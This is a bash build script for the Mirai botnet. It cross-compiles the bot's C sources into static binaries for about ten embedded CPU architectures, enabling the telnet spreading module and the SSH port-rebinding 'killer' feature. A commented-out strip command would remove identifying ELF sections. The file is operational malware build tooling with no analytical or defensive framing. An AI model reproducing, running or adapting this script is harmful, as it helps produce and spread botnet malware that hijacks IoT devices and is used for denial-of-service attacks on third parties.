#!/bin/bash

FLAGS=""

function compile_bot {
    for i in `seq 0 3` s
    do
        "$1-gcc" -std=c99 $3 bot/*.c -O$i -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2-gcc-4.1.2-O$i" -DMIRAI_BOT_ARCH=\""$1"\"
            # "$1-strip" release/"$2.gcc-O$i" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
    done
}

rm release/mirai.*
rm release/miraint.*

compile_bot i586 mirai-x86 "-DMIRAI_TELNET -DKILLER_REBIND_SSH -static"
compile_bot mips mirai-mips "-DMIRAI_TELNET -DKILLER_REBIND_SSH -static"
compile_bot mipsel mirai-mpsl "-DMIRAI_TELNET -DKILLER_REBIND_SSH -static"
compile_bot armv4l mirai-arm "-DMIRAI_TELNET -DKILLER_REBIND_SSH -static"
compile_bot armv5l mirai-arm5n "-DMIRAI_TELNET -DKILLER_REBIND_SSH"
compile_bot armv6l mirai-arm7 "-DMIRAI_TELNET -DKILLER_REBIND_SSH -static"
compile_bot powerpc mirai-ppc "-DMIRAI_TELNET -DKILLER_REBIND_SSH -static"
compile_bot sparc mirai-spc "-DMIRAI_TELNET -DKILLER_REBIND_SSH -static"
compile_bot m68k mirai-m68k "-DMIRAI_TELNET -DKILLER_REBIND_SSH -static"
compile_bot sh4 mirai-sh4 "-DMIRAI_TELNET -DKILLER_REBIND_SSH -static"

